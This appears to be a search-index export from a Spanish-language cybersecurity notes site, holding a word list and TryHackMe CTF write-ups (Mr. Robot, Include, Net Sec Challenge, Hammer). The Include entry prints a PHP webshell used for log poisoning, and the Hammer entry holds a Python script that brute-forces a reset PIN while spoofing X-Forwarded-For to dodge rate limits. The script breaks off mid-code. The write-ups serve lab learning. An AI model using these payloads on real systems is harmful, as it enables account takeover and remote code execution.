tortured\ntossed\ntotal\nTOTAL\ntotally\ntouched\ntough\nTour\nTourbillon\ntoward\ntowards\nTown\nTownship\ntoxic\nToxic\ntoxicity\ntraceable\ntrack\nTracking\ntracks\nTracks\ntrackUrl\ntrademarked\ntraffic\ntragedy\ntragic\nTrail\ntrailer\nTrailer\ntrailers\ntrain\ntrained\ntrans\ntransaction\ntransactions\nTransclusionIcon\ntransgender\ntranslated\ntranslates\ntranslating\ntranslation\nTranslators\ntransmission\ntransparent\ntrap\ntrapped\ntrauma\ntraumatic\ntraumatized\ntrave1er\ntraveler\nTraveler\ntravelled\nTreasury\ntreat\ntreated\ntreatment\ntree\nTrek\nTrending\nTrenton\nTrentonW\ntriality\nTribeca\nTricia\ntricks\ntried\ntries\ntrigger\ntrip\ntrippy\nTrivia\nTriviaEdit\ntrolls\nTrolls\ntrouble\ntroubled\ntrucks\nTrudy\ntrue\nTrue\ntruely\ntruly\ntrunk\ntrust\ntruth\nTruth\ntry\ntrying\ntune\ntunnel\nturn\nturned\nturning\nturns\nTurns\nTURTLE\ntutorials\ntweak\ntweaks\ntweets\nTweets\ntweetsamrat\ntwenty\nTwice\nTwigs\nTwilight\ntwist\ntwisted\ntwists\ntwitter\nTwitter\nTWITTER\nTWITTER1\nTwitterTag\ntwitterwidget\ntwo\nTwo\ntxt\ntyler\nTyler\ntyp\ntype\nType\ntypeof\ntypes\ntypical\ntyping\ntypo\nTypo\ntypos\ntyrel\nTyrel\ntyrell\nTyrell\nTyrellWellick\ntyrels\nTyrrell\nu00A1\nu0103\nu0f4Uka0JzI\nu2019\nu201cCritical\nu201d\nu3Q\nU94litUpZuc\nUChb83McROe3CC2b\nUddevalla\nuFFFF\nUg4fRXGyIak\nUgly\nuHack\nuhm\nuimplying\nultiblue\nultimate\nUltimate\nultimately\nUltimateSupreme\nUltimateSupremecreated\nultra\nUmayer\nunable\nunauthorized\nunaware\nunbearable\nunbidden\nunblocking\nunbreakable\nuncertainty\nuncle\nUncle\nunclear\nuncommon\nuncover\nundecipherable\nundefined\nundelete\nunder\nUnder\nundergoing\nunderground\nunderline\nunderlined\nunderlining\nunderlying\nunderstand\nunderstanding\nunderstood\nundertake\nundisclosed\nundo\nUndo\nundoing\nundone\nunedited\nunemployed\nUnemployed\nunfair\nunfaithful\nunfamiliar\nUnfortunately\nuniform\nunintelligent\nunique\nUnique\nunit\nUnited\nUniversal\nuniverse\nUniverse\nUniversity\nunjust\nunknown\nUnknown\nunlabeled\nunless\nunlike\nUnlike\nunlikely\nunlock\nunmanageable\nUnnamed\nUnnecessary\nunreadable\nUnrelated\nunsecured\nUnsupported\nunsure\nUntheory\nuntil\nUntil\nuntitled\nunusable\nunwanted\nunwittingly\nup4\nupcoming\nUpcoming\nupdate\nUpdate\nupdated\nupdates\nupdating\nupgrading\nupload\nUpload\nuploaded\nuploading\nUploadNewImage\nUploadPhotoDialog\nuploads\nupon\nUpon\nupper\nupset\nupstate\nUrgency\nurging\nurinate\nurl\nURL\nusa\nUSA\nusage\nusanet\nusanetwork\nUSAs\nusb\nUSB\nuse\nUse\nused\nuseeditwarning\nuseful\nUseful\nuselivepreview\nusemsgcache\nusenewrc\nuser\nUser\nuserlandingpage\nuserLogin\nUserlogin\nUserLogin\nUserLogout\nusername\nUsername\nusernames\nuserpage\nUserpage\nUserProfilePage\nUserProfilePageV3\nusers\nUsers\nusers1\nusers7\nUserSignup\nuses\nusing\nUsing\nusr\nUStv\nusually\nUtah\nUTC\nUtero\nUTF\nutilities\nUtilities\nutma\nutmb\nutterly\nuwwROnP4X8A\nUzumaki\nv1ew\nvacation\nVaishnavi\nval\nValerian\nvaluable\nvalue\nvalued\nvalueless\nvalueOf\nvalues\nVampire\nVampireClaymore\nvan\nVan\nvandal\nvandalism\nVandalism\nvandals\nVanguard\nvar\nvariables\nvariant\nvaried\nvaries\nvariety\nvarious\nvarnish\nVault\nvbs\nVelvet\nVendetta\nvengeance\nvera\nVera\nVeraby\nVeraG\nverbatim\nverify\nverion\nversa\nversatility\nversion\nversions\nversus\nVertical\nverticalName\nverticle\nvery\nVery\nveteran\nVfxrishi\nvia\nvice\nVice\nvictims\nVictoria\nvideo\nVideo\nvideohandler\nVideoHandlers\nvideoId\nvideos\nVideos\nVideos1\nVideosEdit\nview\nView\nviewed\nviewer\nviewers\nviewing\nviewPageTarget\nviews\nvigilant\nvigilante\nVigilante\nvignette1\nvignette2\nvignette3\nvignette4\nVignettePathPrefix\nVillar\nviolates\nviolating\nviolence\nViolence\nviolent\nVirginia\nvirtually\nvirus\nviruses\nvision\nvisit\nVisit\nvisited\nvisiting\nvisitors\nvisits\nvisual\nVisual\nvisualeditor\nvisualEditor\nVisualEditor\nvisualize\nvital\nVlop12\nvnd\nVOD\nvoice\nvoiceover\nvoices\nVolunteer\nVon\nvote\nvstf\nVSTF\nVuh\nvulnerabilities\nvulnerability\nvulnerable\nvxd\nvxzzW\nwait\nWait\nwaiting\nwakes\nwalk\nwalked\nWalker\nwalking\nWalking\nwalkingdead\nwalks\nwall\nWall\nwalldelete\nWallDiffPage\nwallet\nWallHistory\nWallHistoryRail\nwalls\nwallshowsource\nWallstr\nWallstrom\nWallWikiActivity\nWaltz\nwant\nWant\nwanted\nWanted\nWantedpages\nWantedPages\nwanting\nwants\nwar\nWar\nwarez\nwarfare\nwarm\nwarmth\nwarn1\nwarn2\nwarn3\nWarner\nwarning\nWarning\nWARNING\nwarnings\nwarns\nwarrant\nwarrants\nwas\nWas\nWashington\nwashroom\nwashtml\nwasn\nwasnt\nwaste\nwatch\nWatch\nWATCH\nwatchcreations\nwatchdefault\nwatchdeletion\nwatched\nwatches\nwatching\nwatchlist\nWatchlist\nwatchlistdays\nwatchlistdigest\nwatchlisthideanons\nwatchlisthidebots\nwatchlisthideliu\nwatchlisthideminor\nwatchlisthideown\nwatchlisthidepatrolled\nwatchmoves\nwatchToken\nwater\nWatercooler\nway\nWayne\nways\nweakness\nweaknesses\nwear\nwearing\nwears\nweary\nweb\nwebcomic\nWebinars\nwebsite\nWebsite\nWEBSITE\nwebsites\nWed\nWednesday\nWednesdays\nweek\nweekly\nWeekly\nweeks\nWeeks\nWei\nweird\nWeird\nwelcome\nWelcome\nWelcome1\nwell\nWell\nwellick\nWellick\nWellickby\nWellickK\nWellicks\nWellickW\nWendy\nwent\nwere\nWere\nweren\nwest\nWest\nweve\nwgAction\nwgAdDriverOpenXBidderCountries\nwgAfterContentAndJS\nwgAmazonMatchCountries\nwgArticleId\nwgArticleInterlangList\nwgArticleType\nwgAssetsManagerQuery\nwgBlankImgUrl\nwgBreakFrames\nwgCanEditPolicies\nwgCanonicalNamespace\nwgCanonicalSpecialPageName\nwgCategories\nwgCategorySelect\nwgCategoryTreePageCategoryOptions\nwgCatId\nwgCdnApiUrl\nwgCdnRootUrl\nwgCityId\nwgContentLanguage\nwgCookieDomain\nwgCookiePath\nwgCopywarn\nwgCurRevisionId\nwgDartCustomKeyValues\nwgDBname\nwgDigitTransformTable\nwgEditedTitle\nwgEditedTitleNS\nwgEditedTitlePrefix\nwgEditPageClass\nwgEditPageFormType\nwgEditPageHandler\nwgEditPageHasEditPermissionError\nwgEditPageIsConflict\nwgEditPageIsNewArticle\nwgEditPageIsReadOnly\nwgEditPageIsWidePage\nwgEditPageLicensingUrl\nwgEditPagePopularTemplates\nwgEditPageSection\nwgEnableCodePageEditor\nwgEnableFacebookClientExt\nwgEnableLightboxExt\nwgEnableMediaGalleryExt\nwgEnableMiniEditorExt\nwgEnableMiniEditorLinkSuggest\nwgEnableNewAuthModal\nwgEnableOpenXSPC\nwgEnableOutboundScreenExt\nwgEnableVideoToolExt\nwgEnableVisualEditorUI\nwgEnableWebPThumbnails\nwgEnableWikiaBarAds\nwgEnableWikiaBarExt\nwgEnableWikiaFollowedPages\nwgEnableWikiaInteractiveMaps\nwgEnableWikiaMiniUploadExt\nwgEnableWikiaPhotoGalleryExt\nwgExtensionsPath\nwgFollowedPagesPagerLimit\nwgFollowedPagesPagerLimitAjax\nwgGaHasAds\nwgIsArticle\nwgIsContentNamespace\nwgIsDarkTheme\nwgIsEditPage\nwgIsGASpecialWiki\nwgIsMainpage\nwgIsMainPage\nwgLinkSuggestElements\nwgMainpage\nwgMaxUploadSize\nwgMessages\nwgMiniEditorLoadOnDemand\nwgMinimalPasswordLength\nwgMWrevId\nwgNamespaceNumber\nwgNow\nwgOasisBreakpoints\nwgOasisGrid\nwgOasisResponsive\nwgPageContentLanguage\nwgPageName\nwgPoliciesEditURL\nwgPoliciesRev\nwgQualarooUrl\nwgRedirectedFrom\nwgRelevantPageName\nwgResourceBasePath\nwgRestrictionCreate\nwgRestrictionEdit\nwgRestrictionMove\nwgRestrictionUpload\nwgRevisionId\nwgRightsText\nwgSassLoadedScss\nwgSeoTestingBucket\nwgSeparatorTransformTable\nwgShowAdModalInterstitialTimes\nwgSitename\nwgStyleVersion\nwgTimeAgoi18n\nwgTitle\nwgTransactionContext\nwgUsePostScribe\nwgUserGroups\nwgUserName\nwgVisualEditor\nwgVisualEditorPreferred\nwgWeppyConfig\nwgWikiaBarMainLanguages\nwgWikiaChatUsers\nwgWikiaChatWindowFeatures\nwgWikiaMaxNameChars\nwgWikiCategories\nwgWikiFactoryTagIds\nwgWikiFactoryTagNames\nwgWikiVertical\nwh1ter0se\nwhat\nWhat\nWHAT\nwhatever\nWhatever\nWhatLinksHere\nwhats\nWhedon\nwhen\nWhen\nwhenever\nWhenever\nwhere\nWhere\nwhereabouts\nwhether\nwhich\nwhile\nWhile\nWhiplash\nwhispers\nwhite\nWhite\nwhiterose\nWhiterose\nwhitespace\nwho\nWho\nwhole\nwhom\nwhomever\nWhos\nwhose\nwhy\nWhy\nwide\nWIDE\nwidely\nwider\nwidespread\nwidget\nwidth\nWidth\nwidths\nwidthType\nwife\nWIFE\nwifi\nwiki\nWiki\nWIKI\nwikia\nWikia\nWikiaBot\nWikiaby\nwikiacsid\nWikiActivity\nWikiaEnableNewCreatepage\nWikiaLabs\nWikiaMainContent\nWikiaMaps\nwikiamediainsert\nWikiaMr\nwikian\nWikiaNewFiles\nWikians\nWikiaPage\nwikiaPageIsCorporate\nwikiaPageType\nWikiaPhotoGallery\nWikiaPhotoGallerySlider\nWikiaPhotoGallerySlideshow\nWikiaPhotoGalleryView\nwikiarelatedpages\nwikias\nWikias\nWikiaSearch\nWikiaStyleGuide\nwikiAugust\nWikiaVideoAdd\nwikibits\nwikiCategory\nwikiCustomKeyValues\nWikiD\nwikiDbName\nWikifactory\nWikiFeatures\nwikiJuly\nwikiJune\nwikiLanguage\nwikiMay\nWikimedia\nwikin\nwikiNovember\nwikiOctober\nwikipedia\nWikipedia\nwikis\nWikis\nwikiSeptember\nWikiStats\nwikitables\nwikitext\nWikitext\nwikiVertical\nwill\nWill\nWilliam\nwilling\nwin\nwind\nwindow\nWindows\nwine\nwins\nwipe\nwipes\nWire\nwise\nwish\nwishes\nwith\nWith\nwithCaption\nwithdrawal\nwithheld\nwithin\nWithin\nwithout\nWithout\nwitnesses\nWitnessme\nwitz\nwllimit\nwmode\nwmu\nwmv\nwmvAdd\nwmvbr\nwmvby\nWolffirefang\nwoman\nwomen\nwon\nwonder\nwondering\nWong\nWood\nWookieepedia\nword\nwordmark\nWordmark\nwords\nWords\nWordsEdit\nwork\nworked\nWorkers\nworking\nWorking\nworks\nworld\nWorld\nWorldwide\nworldwind\nworn\nworried\nworry\nworrying\nWorse\nworth\nwould\nWould\nwouldn\nwoven\nWow\nwpage\nwpSave\nwpTextbox1\nwrite\nWrite\nwriter\nWriter\nwriters\nwrites\nwriting\nWriting\nwritten\nWritten\nwrong\nWrong\nwronged\nwrote\nwtf\nwuz\nWWII\nwww\nWYNTER\nwysiwyg\nx201C\nx26\nx26A\nx26action\nx26ctype\nx26gt\nx26lt\nx26maxage\nx26rs\nx26smaxage\nx26title\nx3c\nx3ca\nx3cbr\nx3cdiv\nx3cmath\nx3cnowiki\nx3cp\nx3e\nx3eAll\nx3eWikia\nX8UR2TFUp8w\nXD1\nxht\nxhtml\nxjs\nXKCD\nxml\nxmpp\nxNnoRBZWeEQ\nXSS\nYcesoft\nyea\nYea\nyeah\nYeah\nyear\nYear201120102009200820072006200520042003200220012000199919981997199619951994199319921991199019891988198719861985198419831982198119801979197819771976197519741973197219711970196919681967196619651964196319621961196019591958195719561955195419531952195119501949194819471946194519441943194219411940193919381937193619351934193319321931193019291928192719261925192419231922192119201919191819171916191519141913191219111910190919081907190619051904190319021901\nyears\nyelled\nyelling\nYep\nyes\nYes\nyesterday\nyesterdays\nyet\nyH5BAEAAAEALAAAAAABAAEAQAICTAEAOw\nyields\nyork\nYork\nyou\nYou\nyoung\nyounger\nyour\nYour\nYOUR\nYoure\nyourself\nYouslypoots\nYouth\nyoutu\nyoutube\nYoutube\nYouTube\nZauberfl\nZealand\nZen\nZeppelin\nzer0\nzer0es\nzero\nZero\nZeroBas\nZeroBased\nzeros\nZeros\nzhthefinalcrush\nZoeyadams\nZombie\nzone\nZone\nzones\nzSqu8myTkY8\nZzydrax",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Mr. Robot CTF",
    "path": "/apuntes/thm/maquinas/2-medium/1-mr-robot/0-mr-robot-ctf/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/1. Mr. Robot/0. Mr. Robot CTF.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 1. Mr. Robot",
    "content": "Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?\n\nCredit to [Leon Johnson](https://twitter.com/@sho_luv) for creating this machine. **This machine is used here with the explicit permission of the creator <3**\n\n![[mrrobot.png]]\n\n1. Conectarse a la VPN de TryHackMe con `sudo openvpn <archivo.ovpn>`.\n\n----------------\n<h2>Contenidos</h2>\n\n- [[1. What is Key 1]]\n- [[2. What is Key 2]]\n- [[3. What is Key 3]]\n- [[fsocity_dic]]\n- [[fsocity_dic_unic]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/maquinas/2-medium/7-include/1-introduction/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/7. Include/1. Introduction.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 7. Include",
    "content": "![[Pasted image 20260211204950.png]]\n\nThis challenge is an initial test to evaluate your capabilities in web pentesting, particularly for server-side attacks. Start the VM by clicking the `Start Machine` button at the top right of the task.\n\nYou will find all the necessary tools to complete the challenge, like Nmap, PHP shells, and many more on the AttackBox.  \n\n_\"Even if it's not accessible from the browser, can you still find a way to capture the flags and sneak into the secret admin panel?\"_",
    "modified": "2026-02-12T01:08:37"
  },
  {
    "title": "0. Include",
    "path": "/apuntes/thm/maquinas/2-medium/7-include/0-include/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/7. Include/0. Include.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 7. Include",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/7. Include/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/2. Medium/7. Include/2. Getting the Flags]]",
    "modified": "2026-02-12T01:08:37"
  },
  {
    "title": "2. Getting the Flags",
    "path": "/apuntes/thm/maquinas/2-medium/7-include/2-getting-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/7. Include/2. Getting the Flags.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 7. Include",
    "content": "<h2>¬øCu√°l es la flag despu√©s de iniciar sesi√≥n en SysMon App?</h2>\n<h4>Escaneo Inicial</h4>\n1. Empezamos realizando un escaneo a todos los puertos de la IP.\n   ![[Pasted image 20260211205256.png]]\n2. Una vez tenemos el escaneo inicial vamos a lanzar un escaneo con todo contra estos puertos.\n   ![[Pasted image 20260211213811.png]]\n   ![[Pasted image 20260211213836.png]]\n   Podemos ver que el puerto 50000 est√° sirviendo un Apache 2.4.41 y el 4000 un Node.js en http, por lo que como siempre que vemos un servicio web, vamos a ver qu√© hay.\n\n<h4>Investigaci√≥n de Puertos</h4>\n1. Vamos a ver qu√© hay en el puerto 50000.\n   ![[Pasted image 20260211214240.png]]\n2. Y en el puerto 4000.\n   ![[Pasted image 20260211214303.png]]\n\n<h4>Investigaci√≥n Web</h4>\n1. Empezamos fuzzeando.\n\t1. En el puerto 50000.\n\t   ![[Pasted image 20260211221934.png]]\n\t2. En el puerto 4000.\n\t   ![[Pasted image 20260211222041.png]]\n2. Seguimos intentando SQL Injection.\n\t1. En el puerto 50000.\n\t   ![[Pasted image 20260211222327.png]]\n\t   ![[Pasted image 20260211222350.png]]\n\t   Captur√© una petici√≥n para usarla con SQLMap (era un formulario POST) pero no hab√≠a ning√∫n par√°metro inyectable.\n\t2. En el puerto 4000 no nos hace falta porque nos han dejado credenciales de acceso.\n\t   ![[Pasted image 20260211221457.png]]\n3. Vamos a meternos en nuestro perfil.\n   ![[Pasted image 20260213170025.png]]\n   Parece que son objetos. Si vamos m√°s abajo podemos ver una manera de lo que parece compartir notas.\n   ![[Pasted image 20260213170059.png]]\n4. Si metemos una nota random como `Book:testBook` se ve reflejado en el perfil, lo que nos lleva a preguntarnos si podremos modificarlos.\n   ![[Pasted image 20260213170143.png]]\n5. Probaremos a introducir `isAdmin:true`.\n   ![[Pasted image 20260213170241.png]]\n6. Se ha cambiado y nos han aparecido dos opciones que antes no hab√≠a:\n\t1. Settings:\n\t   ![[Pasted image 20260213170335.png]]\n\t2. API:\n\t   ![[Pasted image 20260213170352.png]]\n7. Vamos a comprobar si el link de settings realiza peticiones:\n\t1. Configuramos un servidor sencillito:\n\t   ![[Pasted image 20260213170446.png]]\n\t2. Introducimos nuestra URL en la caja y pulsamos enter.\n\t   ![[Pasted image 20260213170554.png]]\n\t3. Observamos si hay conexi√≥n.\n\t   ![[Pasted image 20260213170617.png]]\n8. Vamos a probar a hacer una petici√≥n a la API interna con la direcci√≥n del endpoint censurado: `getAllAdmins101099991`.\n   ![[Pasted image 20260213170830.png]]\n   Obtenemos lo siguiente:\n   ![[Pasted image 20260213170845.png]]\n9. Vamos a decodificarlo.\n   ![[Pasted image 20260213171019.png]]\n10. Iniciamos sesi√≥n en SysMon con las credenciales obtenidas.\n    ![[Pasted image 20260213171141.png]]\n    \n\n>[!SUCCESS] Y as√≠ obtenemos la primera flag.\n>\n\n--------------------------------------\n<h2>¬øCu√°l es el contenido del archivo de texto escondido en /var/www/html?</h2>\n<h4>Investigaci√≥n Web</h4>\n1. Estando ya en la p√°gina del administrador, vamos a mirar desde d√≥nde se carga la imagen de perfil del usuario `administrator`.\n   ![[Pasted image 20260214160839.png]]\n   Parece ser que est√° cargando la foto desde una ruta interna. Esto huele a LFI de manual.\n2. Vamos a intentar acceder a `/etc/passwd`.\n\t1. Primero vamos a la ruta.\n\t   ![[Pasted image 20260214161438.png]]\n\t2. Ahora vamos a probar un par de payloads (`../../` y `....//....//`).\n\t   ![[Pasted image 20260214161839.png]]\n\t   Ninguno ha funcionado, por lo que vamos a fuzzear.\n\t3. Preparamos el comando y lo lanzamos.\n\t   ![[Pasted image 20260214162023.png]]\n\t   Despu√©s de probar un par de diccionarios encontramos varios payloads que funcionan.\n\t4. Si miramos en la web uno de estos payloads:\n\t   ![[Pasted image 20260214162141.png]]\n\t   Observamos que hay dos usuarios `joshua` y `charles`, puede que nos ayude m√°s tarde. Tambi√©n hay un mail server.\n3. Si recordamos el escaneo inicial, hab√≠a varios servicios que nos hac√≠an pensar que pod√≠a haber algo relacionado con el mail. Si buscamos en internet:\n   ![[Pasted image 20260214162358.png]]\n4. Vamos a intentar leerlo.\n   ![[Pasted image 20260214162441.png]]\n   Parece que est√° vac√≠o.\n5. Vamos a intentar mandar un mail al servidor para ver si se registra en los logs aprovechando que el puerto 25 est√° abierto.\n\t1. Buscamos la sintaxis para mandar emails por telnet en SMTP (25).\n\t   ![[Pasted image 20260214162919.png]]\n\t2. Lo replicamos.\n\t   ![[Pasted image 20260214163129.png]]\n\t3. Vamos a ver si se ha registrado.\n\t   ![[Pasted image 20260214163200.png]]\n\t   S√≠ que se ha registrado. Huele a log poisoning debido a que aparece lo que hemos indicado.\n\t   ![[Pasted image 20260214163340.png]]\n\t4. Vamos a intentar un log poisoning con una webshell en php: `<?php system($_GET['cmd']);?>`\n\t   ![[Pasted image 20260214170010.png]]\n\t5. Ahora intentamos cargar la p√°gina con el par√°metro `&cmd=whoami`.\n\t   ![[Pasted image 20260214170028.png]]\n\t6. Vamos a listar ahora `/var/www/html`.\n\t   ![[Pasted image 20260214170138.png]]\n\t7. Lo leemos.\n\t   ![[Pasted image 20260214170234.png]]\n\n>[!SUCCESS] Hemos conseguido obtener las dos flags!!",
    "modified": "2026-02-15T01:10:58"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/maquinas/2-medium/2-net-sec-challenge/1-introduction/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/1. Introduction.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 2. Net Sec Challenge",
    "content": "Usa este reto para poner a prueba tus habilidades adquiridas en el m√≥dulo [[5. Network Security]]. Todas las preguntas pueden ser resueltas usando `nmap`, `telnet` y `hydra`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Net Sec Challenge",
    "path": "/apuntes/thm/maquinas/2-medium/2-net-sec-challenge/0-net-sec-challenge/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/0. Net Sec Challenge.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 2. Net Sec Challenge",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/1. Introduction]]\n[[2. Challenge Questions]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Challenge Questions",
    "path": "/apuntes/thm/maquinas/2-medium/2-net-sec-challenge/2-challenge-questions/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/2. Challenge Questions.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 2. Net Sec Challenge",
    "content": "1. ¬øCu√°l es el puerto abierto m√°s alto (menor del 10000)?\n   ![[Pasted image 20251121171500.png]]\n2. Hay un puerto fuera de los 1000 m√°s comunes abierto (por encima del 10000). ¬øCu√°l es?\n   ![[Pasted image 20251121171710.png]]\n3. ¬øCuantos puertos TCP hay abiertos?\n   Sumamos los que nos han salido: 6\n4. ¬øCu√°l es la flag escondida en el header HTTP del servidor?\n   ![[Pasted image 20251121171842.png]]\n5. ¬øCu√°l es la flag escondida en el header SSH del servidor?\n   ![[Pasted image 20251121171928.png]]\n6. Hay un servidor FTP escuchando en un puerto no est√°ndar. ¬øCu√°l es la versi√≥n del servidor FTP?\n   ![[Pasted image 20251121173917.png]]\n7. Hemos obtenido dos nombres de usuario usando ingenier√≠a social: `eddie` y `quinn`. ¬øCu√°l es la flag escondida en una de estas dos cuentas accesible v√≠a FTP?\n   ![[Pasted image 20251121174557.png]]\n   ![[Pasted image 20251121174624.png]]\n8. Yendo a la direcci√≥n web hosteada en el puerto `8080`, se nos muestra un peque√±o reto que nos dar√° una flag una vez resuelto. ¬øCu√°l es la flag?\n   ![[Pasted image 20251121182347.png]]\n   ![[Pasted image 20251121182352.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/maquinas/2-medium/6-hammer/1-introduction/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/1. Introduction.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 6. Hammer",
    "content": "![[Pasted image 20251226042759.png]]\nCon el Martillo en mano, ¬øpuedes bypassear los mecanismos de autentificaci√≥n y conseguir RCE en el sistema?",
    "modified": "2025-12-27T00:52:04"
  },
  {
    "title": "0. Hammer",
    "path": "/apuntes/thm/maquinas/2-medium/6-hammer/0-hammer/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/0. Hammer.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 6. Hammer",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/2. Getting the Flags]]",
    "modified": "2026-02-12T01:08:37"
  },
  {
    "title": "2. Getting the Flags",
    "path": "/apuntes/thm/maquinas/2-medium/6-hammer/2-getting-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/2. Getting the Flags.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 6. Hammer",
    "content": "1. Empezaremos con el reconocimiento (aunque ya sabemos por donde va a tirar, seguramente algo de MFA).\n\t1. Escaneo de puertos.\n\t   ![[Pasted image 20251226045221.png]]\n\t   Miramos a ver qu√© es el servicio waste.\n\t   ![[Pasted image 20251226045350.png]]\n\t2. Escaneo de puertos en profundidad.\n\t   ![[Pasted image 20251226045429.png]]\n\t   Como el puerto 80 no est√° abierto, no tiene sentido escanear directorios ni subdominios.\n2. Si vamos al puerto `1337` encontramos no que parece un endpoint de login.\n   ![[Pasted image 20251226045730.png]]\n3. Si miramos el c√≥digo fuente podemos ver la convenci√≥n de nombramiento de directorios.\n   ![[Pasted image 20251226045828.png]]\n   Si intentamos hacer fuzzeo de directorios a este tipo de direcci√≥n:\n   ![[Pasted image 20251226050658.png]]\n4. Si le damos al √∫nico archivo aparentemente interesante, `reset_password.php`, podemos ver el c√≥digo de flujo del reseteo de contrase√±as.\n   ![[Pasted image 20251226050007.png]]\n   Parece que hay una cuenta atr√°s en la que tienes que introducir el c√≥digo.\n5. Si revisamos los directorios que encontramos fuzzeando antes, s√≥lo hay dos que parecen poder tener algo interesante.\n\t1. El primero y m√°s interesante es `/hmr_logs/`, el cual contiene logs de error de conexi√≥n en los que se detallan usuarios, endpoints, hostnames, etc.\n\t   ![[Pasted image 20251226051220.png]]\n\t2. El segundo, y algo menos llamativo es `/hmr_images`, en donde hay una imagen de un taller con martillo.\n\t   ![[Pasted image 20251226051304.png]]\n\t   No hay nada en la imagen, por lo que definitivamente seguiremos por el otro lado.\n\t   ![[Pasted image 20251226051450.png]]\n6. Vamos a investigar bien los logs que hemos encontrado.\n   ![[Pasted image 20251226052104.png]]\n\t1. Lo m√°s llamativo a simple vista es que parece que tenemos un usuario: `tester@hammer.thm`.\n\t2. Adem√°s podemos ver la p√°gina a la que aparentemente querr√≠amos poder acceder: `/restricted-area`.\n\t3. Vemos un posible hostname del sistema que nos puede servir m√°s adelante para forzar la entrada por ssh: `hammerthm`.\n\t4. Vemos que hay un login de administrador: `/admin-login`.\n\t5. Parece que hay un l√≠mite de 10 peticiones, pero no sabemos en qu√© se basa para filtrar, todav√≠a.\n7. Con todo esto en mente vamos a investigar las respuestas del servidor con BurpSuite.\n\t1. Para usuario y contrase√±as err√≥neos:\n\t\t1. Manda usuario y contrase√±a por POST.\n\t\t   ![[Pasted image 20251226052659.png]]\n\t\t2. En la respuesta recibimos \"Invalid Email or Password\".\n\t\t   ![[Pasted image 20251226052821.png]]\n\t2. Para usuario correcto y contrase√±a err√≥nea:\n\t\t1. La petici√≥n inicial sigue siendo igual pero con diferentes credenciales.\n\t\t   ![[Pasted image 20251226052934.png]]\n\t\t2. La respuesta tambi√©n es igual.\n\t\t   ![[Pasted image 20251226053050.png]]\n8. Vamos a ver qu√© pasa si le damos a \"Forgot your password?\".\n\t1. Esta petici√≥n ya parece m√°s interesante.\n\t   ![[Pasted image 20251226053711.png]]\n\t   Est√° llamando al endpoint `/reset_password.php`.\n\t2. Si dejamos pasar las peticiones y metemos el email, obtenemos una p√°gina con un contador.\n\t   ![[Pasted image 20251226053918.png]]\n\t3. Si introducimos un c√≥digo que no es no nos saca directamente.\n\t   ![[Pasted image 20251226054009.png]]\n\t4. Si lo introducimos mal unas cuantas veces pone:\n\t   ![[Pasted image 20251226060052.png]]\n9. Ejecutaremos el siguiente c√≥digo.\n   \n```python\nimport requests\nimport sys\nimport random\nfrom concurrent.futures import ThreadPoolExecutor\n\n# Configuraci√≥n\nIP = \"IP\" #Cambia esto\nbase_url = f'http://{IP}:1337'\nurl = f'{base_url}/reset_password.php'\nemail = 'tester@hammer.thm'\nMAX_THREADS = 10\n\nexito = False\n\ndef get_new_session():\n    s = requests.Session()\n    try:\n        s.post(url, data={'email': email}, timeout=10)\n        if 'PHPSESSID' in s.cookies:\n            return s\n    except:\n        return None\n    return None\n\ndef batch_worker(start_pin):\n    global exito\n    if exito: return\n\n    session = get_new_session()\n    if not session: return\n\n    for i in range(7):\n        current_pin = start_pin + i\n        if current_pin > 9999 or exito: break\n        \n        pin_str = f\"{current_pin:04d}\"\n        headers = {\n            'X-Forwarded-For': f\"127.0.0.{random.randint(1,254)}\",\n            'Content-Type': 'application/x-www-form-urlencoded'\n        }\n        data = {'recovery_code': pin_str, 's': '180'}\n\n        try:\n            # Importante: allow_redirects=True para seguir a la p√°gina de nueva password\n            resp = session.post(url, data=data, headers=headers, allow_redirects=True, timeout=10)\n\n            if \"Invalid or expired\" not in resp.text and \"Rate limit\" not in resp.text:\n                exito = True\n                print(f\"\\n\\n[!] ¬°√âXITO! PIN CONFIRMADO: {pin_str}\")\n                print(f\"[+] PHPSESSID: {session.cookies.get('PHPSESSID')}\")\n                print(f\"[+] URL FINAL: {resp.url}\")\n                \n                # Guardamos la p√°gina para que la veas\n                with open(\"exito.html\", \"w\") as f:\n                    f.write(resp.text)\n                print(f\"[+] Contenido guardado en 'exito.html'. √Åbrelo con tu navegador.\")\n                return\n\n            sys.stdout.write(f\"\\r[*] Intentando: {pin_str} \")\n            sys.stdout.flush()\n        